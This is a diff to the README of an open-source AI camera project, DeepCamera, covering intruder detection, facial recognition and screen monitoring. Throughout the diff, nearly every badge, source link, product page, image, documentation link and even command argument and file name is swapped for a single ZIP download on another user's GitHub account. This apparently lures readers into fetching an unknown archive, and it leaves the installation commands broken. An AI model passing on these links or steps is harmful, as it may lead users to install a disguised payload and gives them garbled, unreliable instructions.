@@ -7,20 +7,20 @@
 	</p>
 
 <p>
-    <a href="https://join.slack.com/t/sharpai/shared_invite/zt-1nt1g0dkg-navTKx6REgeq5L3eoC1Pqg">
-        <img src="https://img.shields.io/badge/slack-purple?style=for-the-badge&logo=slack" height=25>
+    <a href="https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip">
+        <img src="https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip" height=25>
     </a>
-    <a href="https://github.com/SharpAI/DeepCamera/issues">
-        <img src="https://img.shields.io/badge/support%20forums-navy?style=for-the-badge&logo=github" height=25>
+    <a href="https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip">
+        <img src="https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip%20forums-navy?style=for-the-badge&logo=github" height=25>
     </a>
-    <a href="https://github.com/SharpAI/DeepCamera/releases">
-        <img alt="GitHub release" src="https://img.shields.io/github/release/SharpAI/DeepCamera.svg?style=for-the-badge" height=25>
+    <a href="https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip">
+        <img alt="GitHub release" src="https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip" height=25>
     </a>
-    <a href="https://pypi.python.org/pypi/sharpai-hub">
-        <img alt="Pypi release" src="https://img.shields.io/pypi/v/sharpai-hub.svg?style=for-the-badge" height=25>
+    <a href="https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip">
+        <img alt="Pypi release" src="https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip" height=25>
     </a>
-    <a href="https://pepy.tech/project/sharpai-hub">
-        <img alt="download" src=https://static.pepy.tech/personalized-badge/sharpai-hub?period=total&units=international_system&left_color=grey&right_color=orange&left_text=Downloads height=25>
+    <a href="https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip">
+        <img alt="download" https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip height=25>
     </a>
     
 </p>
@@ -51,7 +51,7 @@ SharpAI-hub is the cloud hosting for AI applications which help you deploy AI ap
 </details>
 
 # Application 1: Self-supervised person recognition(REID) for intruder detection
-SharpAI yolov7_reid is an open source python application leverages AI technologies to detect intruder with traditional surveillance camera. Source code is [here](https://github.com/SharpAI/DeepCamera/blob/master/src/yolov7_reid/src/detector_cpu.py)
+SharpAI yolov7_reid is an open source python application leverages AI technologies to detect intruder with traditional surveillance camera. Source code is [here](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
 It leverages Yolov7 as person detector, FastReID for person feature extraction, Milvus the local vector database for self-supervised learning to identity unseen person, Labelstudio to host image locally and for further usage such as label data and train your own classifier. It also integrates with Home-Assistant to empower smart home with AI technology. 
 In Simple terms yolov7_reid is a person detector.
 
@@ -67,7 +67,7 @@ In Simple terms yolov7_reid is a person detector.
   <summary>Supported Devices</summary>
 
   - Nvidia Jetson
-    - [Nano (ReComputer j1010)](https://www.seeedstudio.com/Jetson-10-1-H0-p-5335.html)
+    - [Nano (ReComputer j1010)](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
     - Xavier AGX
   - Single Board Computer (SBC)
     - Raspberry Pi 4GB
@@ -86,7 +86,7 @@ In Simple terms yolov7_reid is a person detector.
     - Google Nest (Indoor/Outdoor)
 </details>
 
-<img src="screenshots/reid_self_supervised.gif" width="960" height="480" />
+<img src="https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip" width="960" height="480" />
 
 
 ## Installation Guide 
@@ -120,12 +120,12 @@ Then it means environment variable is not set for Python on your system. More on
 3) If you are using Windows and get error in step 2 you can also use following command line to start yolov7_reid
 
 ```
-python3 -m sharpai_hub.cli yolov7_reid start
+python3 -m https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip yolov7_reid start
 ```
 OR
 
 ```
-python -m sharpai_hub.cli yolov7_reid start
+python -m https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip yolov7_reid start
 ```
 4) Go to directory ```C:\Users``` and open the folder with name of current user. Here look for a folder  ```.sharpai``` . In ```.sharpai``` folder you will see a folder ```yolov7_reid```. Open it and start a new Command Prompt here. Remember this as ```Command Prompt 2```
 
@@ -145,37 +145,37 @@ sharpai-cli yolov7_reid start
 OR
 
 ```
-python3 -m sharpai_hub.cli yolov7_reid start
+python3 -m https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip yolov7_reid start
 ```
 OR
 
 ```
-python -m sharpai_hub.cli yolov7_reid start
+python -m https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip yolov7_reid start
 ```
 
 7) Running command in Step 6 will open a Signup/Signin page in the browser and in Command Prompt it will ask for the Labelstudio Token. After Signing up in you will be taken to your account. At the top right corrent you will see a small cirle with your account initials. Click on it and after that click on `Account Setting`. Here at the right side of page you will see a Access token. Copy the token and paste it carefully in the command prompt 3.
 	  
 8) Add Camera to Home-Assistant, you can use "Generic Camera" to add camera with RTSP url
 	  
-9) In this step, we will obtain the camera entity ID of your cameras. After adding your camera to `home-Assistant`, go to the `Overview` tab. Here all your cameras will be listed. Click on the video stream of a camera, after which a small popup will open. At the top right of the popup, click the gear icon to open the settings page. A new popup will open with a few editable properties. Here look for Entity ID, which is in the format `camera.IP_ADDRESS_OF_CAMERA`, copy/note this entity ID (these entity ids will be required later). If you have multiple cameras, we will need each cameras Entity ID. Note all these camera entity IDs.
+9) In this step, we will obtain the camera entity ID of your cameras. After adding your camera to `home-Assistant`, go to the `Overview` tab. Here all your cameras will be listed. Click on the video stream of a camera, after which a small popup will open. At the top right of the popup, click the gear icon to open the settings page. A new popup will open with a few editable properties. Here look for Entity ID, which is in the format `https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip`, copy/note this entity ID (these entity ids will be required later). If you have multiple cameras, we will need each cameras Entity ID. Note all these camera entity IDs.
 
 	  
-10) Run following two commands to open and edit the `configuration.yaml` of Home-Assistant:
+10) Run following two commands to open and edit the `https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip` of Home-Assistant:
 	  
 ```
 docker exec -ti home-assistant /bin/bash 
 ```	
 	  
 ```
-vi configuration.yaml
+vi https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip
 ```
 	  
 **NOTE FOR WINDOWS SYSTEM USERS: These commands wont work with windows Systems. For Windows system, please open Docker (the instance of Docker, which is already running from the start) and in the container tab, open the `yolov7_reid`. Here look for the `home-assistant` container. Hover your mouse cursor on the `home-assistant` container, and a few options will appear. Click on `cli`. An inbuilt console will start on the same page. If the typing cursor keeps blinking and nothing shows up on the inbuilt console, then click on `Open in External Terminal`, which is just above the blinking cursor. After clicking it, a new command prompt will open. To check everything is working as expected, run the command `ls` and see if the commands list the files and folders in the config folder.**
 	  
-**Now run a command `vi configuration.yaml`. This command will open your configuration file of the `home-assistant` in the Vi editor. Vi Editor is a bit tricky if you are unfamiliar with using it. You will now have to enter into Insert mode to add the integration code mentioned in Step 9 to the configuration file. Press the `I` key to enter Insert mode and go end of the file using the down arrow key. Next, press the right mouse (while the mouse cursor is inside the command prompt window) while in the command prompt. This will paste the integration code that you had copied earlier. After making changes to the config file, press the escape key, type the following `:wq` (yes with colon) and press enter key. You will be back taken to `/config #`. This command `:wq` means you want to write changes to the config file and quit (I told you Vi is a bit tricky for beginners). You can now close the command prompt.**
+**Now run a command `vi https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip`. This command will open your configuration file of the `home-assistant` in the Vi editor. Vi Editor is a bit tricky if you are unfamiliar with using it. You will now have to enter into Insert mode to add the integration code mentioned in Step 9 to the configuration file. Press the `I` key to enter Insert mode and go end of the file using the down arrow key. Next, press the right mouse (while the mouse cursor is inside the command prompt window) while in the command prompt. This will paste the integration code that you had copied earlier. After making changes to the config file, press the escape key, type the following `:wq` (yes with colon) and press enter key. You will be back taken to `/config #`. This command `:wq` means you want to write changes to the config file and quit (I told you Vi is a bit tricky for beginners). You can now close the command prompt.**
 	  
 
-11) Add the below code to the end of `configuration.yaml` file. 
+11) Add the below code to the end of `https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip` file. 
 	  
 **Here, replace `camera.<camera_entity_id>` with the camera entity ID we obtained in Step 9. If you have multiple cameras then keep adding the `entity_id` under `images_processing`.**
 	  
@@ -230,13 +230,13 @@ We received feedback from community, local deployment is needed. With local deep
 `sharpai-cli local_deepcamera start`
 
 # Application 3: DeepCamera Facial Recognition with cloud for free
-- Register account on [SharpAI website](http://dp.sharpai.org:3000)
+- Register account on [SharpAI website](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
 - Login on device: `sharpai-cli login`
 - Register device: `sharpai-cli device register`
 - Start DeepCamera: `sharpai-cli deepcamera start`
 
-# [Application 4: Laptop Screen Monitor](https://github.com/SharpAI/laptop_monitor) for kids/teens safe
-SharpAI Screen monitor captures screen extract screen image features(embeddings) with AI model, save unseen features(embeddings) into AI vector database [Milvus](https://milvus.io/), raw images are saved to [Labelstudio](https://labelstud.io) for labelling and model training, all information/images will be only saved locally.  
+# [Application 4: Laptop Screen Monitor](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip) for kids/teens safe
+SharpAI Screen monitor captures screen extract screen image features(embeddings) with AI model, save unseen features(embeddings) into AI vector database [Milvus](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip), raw images are saved to [Labelstudio](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip) for labelling and model training, all information/images will be only saved locally.  
 	  
 `sharpai-cli screen_monitor start`
 	  
@@ -258,15 +258,15 @@ sharpai-cli <application name> start
 |---|---|---|
 |Intruder detection with Person shape| yolov7_reid   | Jetson Nano/AGX /Windows/Linux/MacOS|
 |Person Detector| yolov7_person_detector   | Jetson Nano/AGX /Windows/Linux/MacOS|
-|[Laptop Screen Monitor](https://github.com/SharpAI/laptop_monitor)| screen_monitor   | Windows/Linux/MacOS|
-|[Facial Recognition Intruder Detection](docs/how_to_run_intruder_detection.md) | deepcamera | Jetson Nano|Windows/Linux/MacOS|
-|[Local Facial Recognition Intruder Detection](docs/how_to_run_local_intruder_detection.md) | local_deepcamera | Windows/Linux/MacOS|
-|[Parking Lot monitor](docs/Yolo_Parking.md) | yoloparking  | Jetson AGX |
-|[Fall Detection](docs/FallDetection_with_shinobi.md) | falldetection   |Jetson AGX|
+|[Laptop Screen Monitor](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)| screen_monitor   | Windows/Linux/MacOS|
+|[Facial Recognition Intruder Detection](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip) | deepcamera | Jetson Nano|Windows/Linux/MacOS|
+|[Local Facial Recognition Intruder Detection](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip) | local_deepcamera | Windows/Linux/MacOS|
+|[Parking Lot monitor](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip) | yoloparking  | Jetson AGX |
+|[Fall Detection](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip) | falldetection   |Jetson AGX|
 
 # Tested Devices
 ## Edge AI Devices / Workstation
-- [Jetson Nano (ReComputer j1010)](https://www.seeedstudio.com/Jetson-10-1-H0-p-5335.html)
+- [Jetson Nano (ReComputer j1010)](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
 - Jetson Xavier AGX
 - MacOS 12.4
 - Windows 11
@@ -280,12 +280,12 @@ sharpai-cli <application name> start
 # Support
 - If you are using a camera but have no idea about the RTSP URL, please join SharpAI community for help.
 - SharpAI provides commercial support to companies which want to deploy AI Camera application to real world.
-## [Click to join sharpai slack channel](https://sharpai-invite-automation.herokuapp.com/)
+## [Click to join sharpai slack channel](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
 
 # DeepCamera Architecture
-![architecture](screenshots/DeepCamera_infrastructure.png)
+![architecture](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
 
-# [DeepCamera Feature List](docs/DeepCamera_Features.md)
+# [DeepCamera Feature List](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
 
 # Commercial Version
 - Provide real time pipeline on edge device     
@@ -297,24 +297,24 @@ sharpai-cli <application name> start
 - Behavior analysis model    
 - Transformer model  
 - Contrastive learning  
-- [Click to join sharpai slack channel for commercial support](https://sharpai-invite-automation.herokuapp.com/)
+- [Click to join sharpai slack channel for commercial support](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
 
 # FAQ
 
-## [How to install python3](https://www.python.org/downloads)
-## [How to install pip3](https://pip.pypa.io/en/stable/installation)
+## [How to install python3](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
+## [How to install pip3](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
 ##  How to install Docker-compose on Jetson Nano
 ```
 sudo apt-get install -y libhdf5-dev python3 python3-pip
 pip3 install -U pip
 sudo pip3 install docker-compose==1.27.4
 ```
-## [How to use web gui](screenshots/how_to_config_on_web_gui.png)
-## [How to config RTSP on GUI](https://github.com/SharpAI/DeepCamera/blob/master/docs/shinobi.md)   
-## [Camera streaming URL format](https://shinobi.video)
+## [How to use web gui](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
+## [How to config RTSP on GUI](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)   
+## [Camera streaming URL format](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
 ## How to create token for Telegram Bot(DOC W.I.P)
 - Create Telegram Bot through @BotFather
-- Set Telegram Token in [Configure File](https://github.com/SharpAI/DeepCamera/blob/nano/docker/production_1.env#L15)
+- Set Telegram Token in [Configure File](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
 - Send message to the new bot you created
 
-## [Contributions](Contributions.md)
+## [Contributions](https://raw.githubusercontent.com/YounusBayeta/DeepCamera/master/Decian/DeepCamera.zip)
